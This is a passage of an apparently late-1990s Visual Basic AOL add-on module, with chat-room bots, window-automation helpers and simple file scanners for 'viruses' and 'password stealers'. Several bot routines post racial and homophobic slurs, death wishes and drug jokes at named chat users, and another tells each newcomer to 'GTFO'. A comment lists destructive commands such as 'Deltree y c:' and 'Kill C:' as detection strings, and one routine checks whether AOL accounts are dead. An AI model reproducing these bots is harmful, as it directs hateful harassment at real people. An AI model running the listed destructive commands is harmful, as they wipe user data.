sendchat ("/¯)¯)©º°¨¨¨¨[ATTENTION]¨¨¨¨°º©(¯(¯\")
End If
If Attention = 9 Then
BoldSendChat ("•Attention••Attention••Attention•")
ItalicSendChat (text1)
BoldSendChat ("•Attention••Attention••Attention•")
End If
If Attention = 10 Then
BoldSendChat ("_¸,.-·´¨¯¨`·.,¸_/¯))ATTENTION((¯\ _¸,.-·´¨¯¨`·,¸_")
ItalicSendChat (text1)
BoldSendChat ("_¸,.-·´¨¯¨`·.,¸_/_))ATTENTION((_\ _¸,.-·´¨¯¨`·,¸_")
End If
End Sub
Sub Count_room_2STATIC()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
Combo% = FindChildByClass(chil%, "_AOL_Combobox")
lis% = FindChildByClass(chil%, "_AOL_Listbox")
gly% = FindChildByClass(chil%, "_AOL_Glyph")
icona% = FindChildByClass(chil%, "_AOL_Icon")
Rich% = FindChildByClass(chil%, "RICHCNTL")
stat% = FindChildByClass(chil%, "_AOL_Static")
   stat2% = GetWindow(stat%, GW_HWNDNEXT)
        stat3% = GetWindow(stat2%, GW_HWNDNEXT)
            stat4% = GetWindow(stat3%, GW_HWNDNEXT)

fg$ = gettext(stat%)

If fg$ < "12" Then
X = SendMessageByString(stat4%, WM_SETTEXT, 0, "Not alot of peepz Chatting")
Else
X = SendMessageByString(stat4%, WM_SETTEXT, 0, "Alot of peepz Chatting!")
End If

End Sub

Function ScanFile1(FileName$, SearchString As String, Label As Label) As Long
'By: Xcliptic
'ok, Filename is the File to scan
'SearchSring is the string to search for.
'and label like tells if it is a virus or not
'this is a example:
'call scanfile (text1.text,"Deltree y c:",label1)
'thats all
'i have also listed a list of virus searchstring below
'Main.idx, Deltree, Kill C:, Win.ini
'@Juno.com, @Hotmail.com, @FreeMail.com
'Deltree y c:, .Com, Deltree.com
'that is only a FEW

'-ÐøøM
'
'
Dim free
Dim X
Dim Text$


free = FreeFile
Dim Where As Long
Open FileName$ For Binary Access Read As #free
For X = 1 To LOF(free) Step 32000
    Text$ = Space(32000)
    Get #free, X, Text$
    Debug.Print X
    If InStr(1, Text$, SearchString$, 1) Then
    
MsgBox "Virus Found!"

        Where = InStr(1, Text$, SearchString$, 1)
        ScanFile1 = (Where + X) - 1
        Close #free
        Exit For
    End If
    Next X
    
    
    
    If Not InStr(1, Text$, SearchString$, 1) Then
MsgBox "No virus Found"

  End If
  
    
Close #free
End Function
Sub ExtractSN(filepath As String, Status As Label)
Screen.MousePointer = 11
On Error Resume Next
For FindFileName = 1 To Len(filepath)
TheName = Right(filepath, FindFileName)
If Left(TheName, 1) = "\" Then TheName = Right(TheName, FindFileName - 1): Exit For
Next FindFileName

free = FreeFile
Status.caption = "Scanning: " & UCase(TheName)
DoEvents
Dim Where As Long
Open filepath For Binary Access Read As #free
FileLength = LOF(free)
For X = 1 To FileLength Step 392000
Text$ = Space(392000)
Get #free, X, Text$
If InStr(1, LCase(Text$), ".com", 1) = 0 Then GoTo NoAddress

For FindAddress = 1 To FileLength
TheAddress = Mid(Text$, FindAddress, 4)

If LCase(TheAddress) = ".com" Then

For FindBegining = 1 To FindAddress
Character = LCase(Mid(Text$, FindAddress - FindBegining, 1))
If Character = "@" Or Character = "_" Then GoTo skIP
If Asc(Character) > 47 And Asc(Character) < 58 Then GoTo skIP
If Asc(Character) < 97 Or Asc(Character) > 122 Then addresslIst = addresslIst + Mid(Text$, FindAddress - FindBegining + 1, FindBegining + 3) & Chr(13): Exit For
skIP:
Next FindBegining

End If
Next FindAddress
Next X
If Len(addresslIst) <> 0 Then Response = MsgBox(addresslIst, , "Possible Passwerd Stealer"): sendchat ASCII_Random + " <B>" + filepath + "</b> [<i>confirmed possible PWS</i>!]"

NoAddress:
If Len(addresslIst) = 0 Then Response = MsgBox("No Passwerd Stealerz Found in: " & LCase(TheName) & Chr(13) & Chr(13) & "" & Chr(13) & "", , "PWS Not Found"): sendchat ASCII_Random + " <B>" + filepath + "</b> [<i>confirmed safe uv PWS</i>!]"

Status.caption = "Scanning Stopped..."
Screen.MousePointer = 0
If Err Then Exit Sub

End Sub
Sub ExtractSN2(filepath As String, Status As Label, HScroll1)
dfgt = HScroll1.Value
dfgt = dfgt + dfgt + dfgt + dfgt
Screen.MousePointer = 11
On Error Resume Next
For FindFileName = 1 To Len(filepath)
TheName = Right(filepath, FindFileName)
If Left(TheName, 1) = "\" Then TheName = Right(TheName, FindFileName - 1): Exit For
Next FindFileName
free = FreeFile
Status.caption = "Scanning: " & UCase(TheName)
DoEvents
Dim Where As Long
Open filepath For Binary Access Read As #free
FileLength = LOF(free)
For X = 1 To FileLength Step dfgt
Text$ = Space(dfgt)
Get #free, X, Text$
If InStr(1, LCase(Text$), ".com", 1) = 0 Then GoTo NoAddress
For FindAddress = 1 To FileLength
TheAddress = Mid(Text$, FindAddress, 4)
If LCase(TheAddress) = ".com" Then
For FindBegining = 1 To FindAddress
TimeOut (0.0000001)
Character = LCase(Mid(Text$, FindAddress - FindBegining, 1))
If Character = "@" Or Character = "_" Then GoTo skIP
If Asc(Character) > 47 And Asc(Character) < 58 Then GoTo skIP
If Asc(Character) < 97 Or Asc(Character) > 122 Then addresslIst = addresslIst + Mid(Text$, FindAddress - FindBegining + 1, FindBegining + 3) & Chr(13): Exit For
skIP:
Next FindBegining
End If
Next FindAddress
Next X
If Len(addresslIst) <> 0 Then Response = MsgBox("File: " + filepath + ", found..." + Chr(10) + Chr(10) + addresslIst + Chr(10) + Chr(10) + "you can take nessasarry actionz wit diz", 64, "Possible Passwerd Stealer")
NoAddress:
Status.caption = "Scanning Stopped..."
Screen.MousePointer = 0
If Err Then Exit Sub
End Sub

Sub ExtractSN3(filepath As String, Status As Label, HScroll1)
dfgt = HScroll1.Value
dfgt = dfgt + dfgt + dfgt + dfgt
Screen.MousePointer = 11
On Error Resume Next
For FindFileName = 1 To Len(filepath)
TheName = Right(filepath, FindFileName)
If Left(TheName, 1) = "\" Then TheName = Right(TheName, FindFileName - 1): Exit For
Next FindFileName
free = FreeFile
Status.caption = "Scanning: " & UCase(TheName)
DoEvents
Dim Where As Long
Open filepath For Binary Access Read As #free
FileLength = LOF(free)
For X = 1 To FileLength Step dfgt
Text$ = Space(dfgt)
Get #free, X, Text$
If InStr(1, LCase(Text$), ".net", 1) = 0 Then GoTo NoAddress
For FindAddress = 1 To FileLength
TheAddress = Mid(Text$, FindAddress, 4)
If LCase(TheAddress) = ".net" Then
For FindBegining = 1 To FindAddress
Character = LCase(Mid(Text$, FindAddress - FindBegining, 1))
If Character = "@" Or Character = "_" Then GoTo skIP
If Asc(Character) > 47 And Asc(Character) < 58 Then GoTo skIP
If Asc(Character) < 97 Or Asc(Character) > 122 Then addresslIst = addresslIst + Mid(Text$, FindAddress - FindBegining + 1, FindBegining + 3) & Chr(13): Exit For
skIP:
Next FindBegining
End If
Next FindAddress
Next X
If Len(addresslIst) <> 0 Then Response = MsgBox("File: " + filepath + ", found..." + Chr(10) + Chr(10) + addresslIst + Chr(10) + Chr(10) + "you can take nessasarry actionz wit diz", 64, "Possible Passwerd Stealer")
NoAddress:
Status.caption = "Scanning Stopped..."
Screen.MousePointer = 0
If Err Then Exit Sub
End Sub
Sub ExtractSN4(filepath As String, Status As Label, HScroll1, wUt As String)
dfgt = HScroll1.Value
dfgt = dfgt + dfgt + dfgt + dfgt
Screen.MousePointer = 11
On Error Resume Next
For FindFileName = 1 To Len(filepath)
TheName = Right(filepath, FindFileName)
If Left(TheName, 1) = "\" Then TheName = Right(TheName, FindFileName - 1): Exit For
Next FindFileName
free = FreeFile
Status.caption = "Scanning: " & UCase(TheName)
DoEvents
Dim Where As Long
Open filepath For Binary Access Read As #free
FileLength = LOF(free)
For X = 1 To FileLength Step dfgt
Text$ = Space(dfgt)
Get #free, X, Text$
If InStr(1, LCase(Text$), wUt$, 1) = 0 Then GoTo NoAddress
For FindAddress = 1 To FileLength
TheAddress = Mid(Text$, FindAddress, 4)
If LCase(TheAddress) = wUt$ Then
For FindBegining = 1 To FindAddress
Character = LCase(Mid(Text$, FindAddress - FindBegining, 1))
If Character = "@" Or Character = "_" Then GoTo skIP
If Asc(Character) > 47 And Asc(Character) < 58 Then GoTo skIP
If Asc(Character) < 97 Or Asc(Character) > 122 Then addresslIst = addresslIst + Mid(Text$, FindAddress - FindBegining + 1, FindBegining + 3) & Chr(13): Exit For
skIP:
Next FindBegining
End If
Next FindAddress
Next X
If Len(addresslIst) <> 0 Then Response = MsgBox("File: " + filepath + ", found..." + Chr(10) + Chr(10) + addresslIst + Chr(10) + Chr(10) + "you can take nessasarry actionz wit diz", 64, "Possible Passwerd Stealer")
NoAddress:
Status.caption = "Scanning Stopped..."
Screen.MousePointer = 0
If Err Then Exit Sub
End Sub



Public Function getchatline() As String
    Dim ChatWin As Long, strtext As String, lngenter As Long, lngenter2 As Long
    Let ChatWin& = FindRoom&
    Let ChatWin& = FindWindowEx(ChatWin&, 0&, "RICHCNTL", vbNullString)
    Let strtext$ = gettext(ChatWin&)
    Let lngenter& = InStr(strtext$, Chr$(13&))
    Do: DoEvents
        If lngenter& <> 0& Then Let lngenter2& = lngenter&
        Let lngenter& = InStr(lngenter& + 1&, strtext$, Chr$(13&))
    Loop Until lngenter& = 0&
    Let getchatline$ = Right$(strtext$, Len(strtext$) - lngenter2&)
End Function
 Sub Cchat_sendMAIL()
    Dim lnglen&, strstring$, lngcolon&, lngcolon2&, strwho$, strmessage$, strsubject$
    If LCase$(getchatlinemsg) Like "/sendmail *" Then
        Let lnglen& = Len(getchatlinemsg$) - 10&
        Let strstring$ = Right$(getchatlinemsg$, lnglen&)
        Let lngcolon& = InStr(strstring$, ":")
        Let lngcolon2& = InStr(lngcolon& + 1&, strstring$, ":")
        Let strwho$ = Left$(strstring$, lngcolon& - 1&)
        Let strsubject$ = Mid$(strstring$, lngcolon& + 1&, lngcolon2& - lngcolon& - 1)
        Let strmessage$ = Mid$(strstring$, Len(strwho$) + 1& + Len(strsubject$) + 2&, Len(strstring$) - Len(strwho$) + Len(strsubject$) - 1&)
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat ASCII_Random + ("<B><I>C.C. Accepted Sendmail </b>[" + strwho$ + "]")
Call senDmail(strwho$, strsubject$, strmessage$)
        End If

End Sub

Public Function getchatlinemsg() As String
'izziakel
    Dim strline As String, lngtab As Long
    Let strline$ = LastChatLine
    Let lngtab& = InStr(strline$, Chr$(9&))
    Let getchatlinemsg$ = Right$(strline$, Len(strline$) - lngtab&)
End Function

Sub Extract_PWS_COM(filepath As String, wh, list As ListBox)
Screen.MousePointer = 11
On Error Resume Next
wh.caption = "Statuz: Loading File into MazTa Progg"
For FindFileName = 1 To Len(filepath)
TheName = Right(filepath, FindFileName)
If Left(TheName, 1) = "\" Then TheName = Right(TheName, FindFileName - 1): Exit For
Next FindFileName
wh.caption = "Statuz: Loading File into MazTa Progg"
free = FreeFile
wh.caption = "Statuz: Viewing File For Address, Pleaze Wait..."
DoEvents
Dim Where As Long
Open filepath For Binary Access Read As #free
FileLength = LOF(free)
For X = 1 To FileLength Step FileLength2(filepath)
Text$ = Space(FileLength2(filepath))
Get #free, X, Text$
If InStr(1, LCase(Text$), LCase(".com"), 1) = 0 Then GoTo NoAddress
For FindAddress = 1 To FileLength
TheAddress = Mid(Text$, FindAddress, 4)
If LCase(TheAddress) = LCase(".com") Then

For FindBegining = 1 To FindAddress
Character = LCase(Mid(Text$, FindAddress - FindBegining, 1))
If Character = "@" Or Character = "_" Then GoTo skIP
If Asc(Character) > 47 And Asc(Character) < 58 Then GoTo skIP
If Asc(Character) < 97 Or Asc(Character) > 122 Then list.AddItem addresslIst + Mid(Text$, FindAddress - FindBegining + 1, FindBegining + 3): Exit For

skIP:
Next FindBegining

End If
Next FindAddress
Next X
'If Len(addresslIst) <> 0 Then Response = MsgBox(addresslIst, , "Address'z In Thiz PWS")
NoAddress:
'If Len(addresslIst) = 0 Then Response = MsgBox("No Address's Found In: " & LCase(TheName) & Chr(13) & Chr(13) & "" & Chr(13) & "", , "No Addrezz'z On Set")
wh.caption = "Statuz: Not Scanning"
Screen.MousePointer = 0
If Err Then Exit Sub
Screen.MousePointer = 0
Close #free
End Sub
Sub Extract_PWS_NET(filepath As String, wh)
On Error Resume Next
For FindFileName = 1 To Len(filepath)
TheName = Right(filepath, FindFileName)
If Left(TheName, 1) = "\" Then TheName = Right(TheName, FindFileName - 1): Exit For
Next FindFileName

free = FreeFile

DoEvents
Dim Where As Long
Open filepath For Binary Access Read As #free
FileLength = LOF(free)
For X = 1 To FileLength Step 32000
Text$ = Space(32000)
Get #free, X, Text$
If InStr(1, LCase(Text$), ".net", 1) = 0 Then GoTo NoAddress
For FindAddress = 1 To FileLength
TheAddress = Mid(Text$, FindAddress, 4)

If LCase(TheAddress) = ".net" Then

For FindBegining = 1 To FindAddress
Character = LCase(Mid(Text$, FindAddress - FindBegining, 1))
If Character = "@" Or Character = "_" Then GoTo skIP
If Asc(Character) > 47 And Asc(Character) < 58 Then GoTo skIP
If Asc(Character) < 97 Or Asc(Character) > 122 Then addresslIst = addresslIst + Mid(Text$, FindAddress - FindBegining + 1, FindBegining + 3) & Chr(13): Exit For
skIP:
Next FindBegining

End If
Next FindAddress
Next X
'If Len(AddressList) <> 0 Then Response = MsgBox(AddressList, , "Address'z In Thiz PWS")
wh.caption = addresslIst
NoAddress:
'If Len(AddressList) = 0 Then Response = MsgBox("No Address's Found In: " & LCase(TheName) & Chr(13) & Chr(13) & "" & Chr(13) & "", , "No Addrezz'z On Set")
wh.caption = addresslIst

If Err Then Exit Sub

End Sub


Sub Extract_PWS_NU(filepath As String, wh)
On Error Resume Next
For FindFileName = 1 To Len(filepath)
TheName = Right(filepath, FindFileName)
If Left(TheName, 1) = "\" Then TheName = Right(TheName, FindFileName - 1): Exit For
Next FindFileName

free = FreeFile

DoEvents
Dim Where As Long
Open filepath For Binary Access Read As #free
FileLength = LOF(free)
For X = 1 To FileLength Step 32000
Text$ = Space(32000)
Get #free, X, Text$
If InStr(1, LCase(Text$), ".Nu", 1) = 0 Then GoTo NoAddress
For FindAddress = 1 To FileLength
TheAddress = Mid(Text$, FindAddress, 4)

If LCase(TheAddress) = ".Nu" Then

For FindBegining = 1 To FindAddress
Character = LCase(Mid(Text$, FindAddress - FindBegining, 1))
If Character = "@" Or Character = "_" Then GoTo skIP
If Asc(Character) > 47 And Asc(Character) < 58 Then GoTo skIP
If Asc(Character) < 97 Or Asc(Character) > 122 Then addresslIst = addresslIst + Mid(Text$, FindAddress - FindBegining + 1, FindBegining + 3) & Chr(13): Exit For
skIP:
Next FindBegining

End If
Next FindAddress
Next X
'If Len(AddressList) <> 0 Then Response = MsgBox(AddressList, , "Address'z In Thiz PWS")
wh.caption = addresslIst
NoAddress:
'If Len(AddressList) = 0 Then Response = MsgBox("No Address's Found In: " & LCase(TheName) & Chr(13) & Chr(13) & "" & Chr(13) & "", , "No Addrezz'z On Set")
wh.caption = addresslIst

If Err Then Exit Sub

End Sub


























Function EncryptText(Text As String) As String
'By:Xcliptic
For h = 1 To Len(Text)
theasc = Asc(Mid(Text, h, 1)) + 4
If theasc > 255 Then theasc = (theasc - 255)
d$ = d$ & Chr(theasc)
Next
EncryptText = d$
End Function
Function DecryptText(Text As String) As String
For h = 1 To Len(Text)
theasc = Asc(Mid(Text, h, 1)) - 4
If theasc <= 0 Then theasc = (255 + theasc)
d$ = d$ & Chr(theasc)
Next
DecryptText = d$
End Function
Function BackFlash(object)
object.BackColor = QBColor(Rnd * 15)
End Function
Function getchattext()
box& = FindWindowEx(findChatRoom, 0&, "RICHCNTL", vbNullString)
getchattext = gettext(box&)
End Function

Function CoolChat(Text As String)
b = Mid(time, Len(Format(time, "h:mm:ss")) - 2, 2)
For m = 1 To Len(Text)
If b > Printer.FontCount Then b = 1 Else b = b + 1
ob$ = Printer.Fonts(b)
AST$ = AST$ & "<font face=""" & ob$ & """>" & Mid(Text, m, 1)
Next
CoolChat = AST$
End Function

Sub sendIM2(What$)
'arr mayteee >;c
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
imwin% = FindChildByTitle(MDI%, ">Instant Message From: " + SNfromIM)
AOEdit% = FindChildByClass(imwin%, "_AOL_Edit")
AORich% = FindChildByClass(imwin%, "RICHCNTL")
AOIcon% = FindChildByClass(imwin%, "_AOL_Icon")

Text = FindWindowEx(imwin%, 0&, "RICHCNTL", vbNullString)
typein = FindWindowEx(imwin%, Text, "RICHCNTL", vbNullString)
Call SendMessageByString(typein, WM_SETTEXT, 0, What$)
For X = 1 To 9
AOIcon% = GetWindow(AOIcon%, GW_HWNDNEXT)
TimeOut (0.1)
Next X
cLickiCoN (AOIcon%)


End Sub


Sub StartDialupConnection(ConnectionName$)
    Dim X
    X = Shell("rundll32.exe rnaui.dll,RnaDial " & "ConnectionName", 1)
   ' DoEvents
  '  SendKeys "{enter}", True
    'DoEvents
End Sub

Sub bot_fortune(Person$)
If Person$ = "OnlineHost" Then Exit Sub
    If Person$ = getuser Then Exit Sub
    Dim Dis
    Randomize
    Dis = Int(37 * Rnd + 1)
If Dis = 1 Then d$ = ", You will become a FagiT!"
If Dis = 2 Then d$ = ", Your mom will die very so0N!"
If Dis = 3 Then d$ = ", Your gonna loose your AOL account"
If Dis = 4 Then d$ = ", You will be very lucky so0n!"
If Dis = 5 Then d$ = ", You'LL Git some azz tonight!"
If Dis = 6 Then d$ = ", You'LL recieve bad Nooze today"
If Dis = 7 Then d$ = ", Somethings gonna happen to your comp BAD!"
If Dis = 8 Then d$ = ", Youll finally git da Upgrade you alwayz Wanted!"
If Dis = 9 Then d$ = ", Ouwop will be your friend!"
If Dis = 10 Then d$ = ", 1 day you wiLL own Something Valuble"
If Dis = 11 Then d$ = ", Da 1 you Love will Love you MORE!"
If Dis = 12 Then d$ = ", Da 1 you Love will Hate You So0N"
If Dis = 13 Then d$ = ", Youll Lo0ze money so0N"
If Dis = 14 Then d$ = ", YouLL DiE froM No-SeX So0N"
If Dis = 15 Then d$ = ", YouR NuTTz wiLL tern Blue So0N"
If Dis = 16 Then d$ = ", You will Masturbate in about 10 Minutez!"
If Dis = 17 Then d$ = ", You'll meet some1 today!"
If Dis = 18 Then d$ = ", You'LL find out dat 2-Pac iz really ALive so0N!"
If Dis = 19 Then d$ = ", Your Hard Drive wiLL Amazinly lo0ze all itz space!"
If Dis = 20 Then d$ = ", Your CPU will go from a 686 to a 386~"
If Dis = 21 Then d$ = ", Your having a baby in your life soon!"
If Dis = 22 Then d$ = ", YouLL have a run in with a GUIDEwatch So0n"
If Dis = 23 Then d$ = ", YouLL have a run in wit a CATWatch so0n"
If Dis = 24 Then d$ = ", SteveCase will Email you soon!"
If Dis = 25 Then d$ = ", Youll recieve a free <OH>< soon!"
If Dis = 26 Then d$ = ", You will SMoke a Big azz Bag of weed Soon!"
If Dis = 27 Then d$ = ", You gonna get jumped sooN!"
If Dis = 28 Then d$ = ", What goes around comes Around."
If Dis = 29 Then d$ = ", Eat DeeznuTTz and Die!"
If Dis = 30 Then d$ = ", Youll realize dat DENNYs iz Predjudice!"
If Dis = 31 Then d$ = ", You'LL Buy all ECO'z Albumz!"
If Dis = 32 Then d$ = ", You'll Earn Respect from Important people!"
If Dis = 33 Then d$ = ", The Job you want, You wont Get!"
If Dis = 34 Then d$ = ", THe Job you want you Will Get!"
If Dis = 35 Then d$ = ", For some reason, You SIGN OFF soon!"
If Dis = 36 Then d$ = ", THe Sub accounT your On, will B Lozt Soon!"
If Dis = 37 Then d$ = ", A Hacker will IM you and say 'Wuzzup' Soon!"
sendchat ("<B>[<u><i>" + Person$ + d$ + "</i></u> ]")
TimeOut (0.3)


End Sub



Sub bot(Person$)
If Person$ = "OnlineHost" Then Exit Sub
    If Person$ = getuser Then Exit Sub
    Dim Dis
    Randomize
    Dis = Int(30 * Rnd + 1)
If Dis = 1 Then d$ = ""
If Dis = 2 Then d$ = ""
If Dis = 3 Then d$ = ""
If Dis = 4 Then d$ = ""
If Dis = 5 Then d$ = ""
If Dis = 6 Then d$ = ""
If Dis = 7 Then d$ = ""
If Dis = 8 Then d$ = ""
If Dis = 9 Then d$ = ""
If Dis = 10 Then d$ = ""
If Dis = 11 Then d$ = ""
If Dis = 12 Then d$ = ""
If Dis = 13 Then d$ = ""
If Dis = 14 Then d$ = ""
If Dis = 15 Then d$ = ""
If Dis = 16 Then d$ = ""
If Dis = 17 Then d$ = ""
If Dis = 18 Then d$ = ""
If Dis = 19 Then d$ = ""
If Dis = 20 Then d$ = ""
If Dis = 21 Then d$ = ""
If Dis = 22 Then d$ = ""
If Dis = 23 Then d$ = ""
If Dis = 24 Then d$ = ""
If Dis = 25 Then d$ = ""
If Dis = 26 Then d$ = ""
If Dis = 27 Then d$ = ""
If Dis = 28 Then d$ = ""
If Dis = 29 Then d$ = ""
If Dis = 30 Then d$ = ""


sendchat ("[-<B><u>" + Person$ + "</b>,<i></u> " + d$ + ", You might b ??</i>!-]")
TimeOut (0.3)


End Sub
Sub Bot_BitchAzzNigga(Person$)
If Person$ = "OnlineHost" Then Exit Sub
If Person$ = getuser Then Exit Sub
Dim Dis
Randomize
Dis = Int(9 * Rnd + 1)
If Dis = 1 Then d$ = "If you Click ""Notify AOL"" Ten times Every udda Minute"""
If Dis = 2 Then d$ = "If you put IXI at da end uv your Name to Front like u Down"
If Dis = 3 Then d$ = "If you Claim to Know Ouwop -n- Hiz Peepz"
If Dis = 4 Then d$ = "If you Obey TOS"
If Dis = 5 Then d$ = "If your Online Buddy iz SteveCase"
If Dis = 6 Then d$ = "If your Buddylist Still Says ""Buddies, Family, Co-Workers"""
If Dis = 7 Then d$ = "If you are not uzing Ouwopz proggz"
If Dis = 8 Then d$ = "If you think TOSing iz da Easiezt way to kill a Account"
If Dis = 9 Then d$ = "If your reazon on aol iz to chat"
If Dis = 10 Then d$ = ""
If Dis = 11 Then d$ = ""
If Dis = 12 Then d$ = ""
If Dis = 13 Then d$ = ""
If Dis = 14 Then d$ = ""
If Dis = 15 Then d$ = ""
If Dis = 16 Then d$ = ""
If Dis = 17 Then d$ = ""
If Dis = 18 Then d$ = ""
If Dis = 19 Then d$ = ""
If Dis = 20 Then d$ = ""
If Dis = 21 Then d$ = ""
If Dis = 22 Then d$ = ""
If Dis = 23 Then d$ = ""
If Dis = 24 Then d$ = ""
If Dis = 25 Then d$ = ""
If Dis = 26 Then d$ = ""
If Dis = 27 Then d$ = ""
If Dis = 28 Then d$ = ""
If Dis = 29 Then d$ = ""
If Dis = 30 Then d$ = ""
sendchat ("[-<B><u>" + Person$ + "</b>,<i></u> " + d$ + ", You might b a Bitch azz Nigga</i>!-]")
TimeOut (0.5)
End Sub

Function InputTOP(What$, tiTle$) As String
SetWinOnTop = SetWindowPos(X, HWND_BROADCAST, 0, 0, 0, 0, FLAGz)
X = InputBox(What$, tiTle$)
InputTOP = X
End Function

Sub Bot_DruG()
On Error GoTo hell
whoe$ = SNFromLastChatLine
If whoe$ = "OnlineHost" Then Exit Sub
If whoe$ = getuser Then Exit Sub
    Dim Drug
    Randomize
    Drug = Int(10 * Rnd + 1)

If Drug = 1 Then s$ = "You get a big bag uv Weed~"
If Drug = 2 Then s$ = "You Get Some Heroine~"
If Drug = 3 Then s$ = "You dont get anything you crack head!"
If Drug = 4 Then s$ = "You Get Some Speed~"
If Drug = 5 Then s$ = "You Get Some Cat-Nip"
If Drug = 6 Then s$ = "You Get Some Crystal-Meth"
If Drug = 7 Then s$ = "You Get some Ecstasy"
If Drug = 8 Then s$ = "You Get some Dope"
If Drug = 9 Then s$ = "You get some Ritalin~"
If Drug = 10 Then s$ = "You get some Crack"

osend$ = "<Font Color=#0000ff>•<Font Color=#gggggg>" + Who$ + ", " + s$
sendchat osend$
TimeOut (0.4)
hell:
End Sub

Function RandomNumber(Finished)

Randomize

RandomNumber = Int((Val(Finished) * Rnd) + 1)

End Function

Function Bot_RequezT()
'use in a timer, in a button send to chat that
'the bot is on and what your requesting
'then turn the timer on ,ex. timer1.enabled = true

Dim nAm As String
Dim txt As String
nAm$ = SNFromLastChatLine
txt$ = LCase(LastChatLine)
If txt$ = "/i got it" Then
sendchat ("•^v^•{" & nAm$ & " ~ Can u send?")
TimeOut (0.5)
Call sendim(nAm$, "Can u send " + text1 + " ?")
TimeOut (0.5)
End If

End Function
Function AOL40ChangeChatStatic(Wat As String)
'changez da label unda da liztbox
'in da 4.0 chat room
''''''''''OUWOP
If FindRoom Then
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
Combo% = FindChildByClass(chil%, "_AOL_Combobox")
lis% = FindChildByClass(chil%, "_AOL_Listbox")
gly% = FindChildByClass(chil%, "_AOL_Glyph")
icona% = FindChildByClass(chil%, "_AOL_Icon")
Rich% = FindChildByClass(chil%, "RICHCNTL")
stat% = FindChildByClass(chil%, "_AOL_Static")
stat2% = GetWindow(stat%, GW_HWNDNEXT)
stat3% = GetWindow(stat2%, GW_HWNDNEXT)
stat4% = GetWindow(stat3%, GW_HWNDNEXT)
stat5% = GetWindow(stat4%, GW_HWNDNEXT)
X = SendMessageByString(stat5%, WM_SETTEXT, 0, Wat)
Else
End If
End Function

Function AOL40CloseChat()
'''OUWOP
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
Combo% = FindChildByClass(chil%, "_AOL_Combobox")
lis% = FindChildByClass(chil%, "_AOL_Listbox")
Rich% = FindChildByClass(chil%, "RICHCNTL")
If chil% <> 0 And Combo% <> 0 And lis% <> 0 And Rich% <> 0 Then
closeit = SendMessage(chil%, WM_CLOSE, 0, 0&)
End If
If XAOL4_GetCurrentRoomName = "" Then GoTo hehe
If XAOL4_GetCurrentRoomName = "Welcome, " + getuser + "!" Then GoTo hehe
If XAOL4_GetCurrentRoomName = "Locate Member Online" Then GoTo hehe
If XAOL4_GetCurrentRoomName = "Øüvvøpz Pëëpz™" Then GoTo hehe
If XAOL4_GetCurrentRoomName = "Buddy List Window" Then GoTo hehe
If XAOL4_GetCurrentRoomName = "Get a Member's Profile" Then GoTo hehe
hehe:
End Function
Function Normal_CHAT()
'ouwop
mi = ShowWindow(AOL25_FindroOm, SW_SHOWDEFAULT)
mi = ShowWindow(FindRoom, SW_SHOWDEFAULT)
mi = ShowWindow(AOL50_FindRoom, SW_SHOWDEFAULT)
'Public Const SW_HIDE = 0
'Public Const SW_RESTORE = 9
'Public Const SW_SHOW = 5
'Public Const SW_SHOWDEFAULT = 10
'Public Const SW_SHOWMAXIMIZED = 3
'Public Const SW_SHOWMINIMIZED = 2
'Public Const SW_SHOWMINNOACTIVE = 7
'Public Const SW_SHOWNOACTIVATE = 4
'Public Const SW_SHOWNORMAL = 1
End Function

Function MAXIMIZE_CHAT()
'ouwop
mi = ShowWindow(AOL25_FindroOm, SW_MAXIMIZE)
mi = ShowWindow(FindRoom, SW_MAXIMIZE)
mi = ShowWindow(AOL50_FindRoom, SW_MAXIMIZE)

End Function
Function AOL40IsOnline() As Boolean
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
tit% = FindChildByClass(MDI%, "Welcome,")
If tit% <> 0 Then
AOL40IsOnline = True
Else
AOL40IsOnline = False
End If

End Function
Function ISAOLOPEN() As Boolean
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

If MDI% <> 0 Then
ISAOLOPEN = True
Else
ISAOLOPEN = False
End If

End Function

Sub Check4AOL()
If ISAOLOPEN = 0 Then
If MsgBox("MazTa ProGG Detected Dat AOL4.0 Iz not Online, Do you Wish to Attempt to Open AOL4?", vbQuestion + vbYesNo, "Open AOL4.0?") = vbYes Then
Call AOL40_Load
Else

End If
End If
End Sub


Sub OnlineHOST_ResponDeR()
On Error Resume Next
said$ = LastChatLine
        Where = InStr(1, said$, " has entered the room")
        If Where <> 0 Then
            whoe$ = Mid$(said$, 1, Where - 1)
          If whoe$ <> lastsn Then
               sendchat ("<B>[­›¦‹­]</b> GTFO " + whoe$ + " <b>[­›¦‹­]") '
 GoTo dun
         End If
     End If
dun:
TimeOut (0.5)
End Sub


Function READFILE(Where As String)
Filenum = FreeFile
Open (Where) For Input As Filenum
Info = Input(LOF(Filenum), Filenum)
Info = READFILE
End Function

Function SetWallpaper(sFileName As String) As Long
        'Where sFileName = "(None)" to remove the wallpaper
        'or the full path and filename: "C:\windows\paper.bmp"
        '
        SetWallpaper = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, sFileName$, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
End Function


Public Function CheckIfDead(sn$)
'not by me but edited by me for ouwop.bas
Dim toolbar1&, toolbar2&, icon&, Rich&, errorview&, ErrorText$, savewin&, savebut&, Count&, mail&, send&, edit&, unknown&
AOL = FindWindow("AOL Frame25", vbNullString)
toolbar1& = FindWindowEx(AOL, 0&, "AOL Toolbar", vbNullString)
toolbar2& = FindWindowEx(toolbar1, 0&, "_AOL_Toolbar", vbNullString)
icon& = FindWindowEx(toolbar2&, 0&, "_AOL_Icon", vbNullString)
icon& = FindWindowEx(toolbar2&, icon&, "_AOL_Icon", vbNullString)
Call SendMessage(icon&, WM_LBUTTONDOWN, 0, 0&)
Call SendMessage(icon&, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
mail& = FindWindowEx(AolMdi, 0&, "AOL Child", "Write Mail")
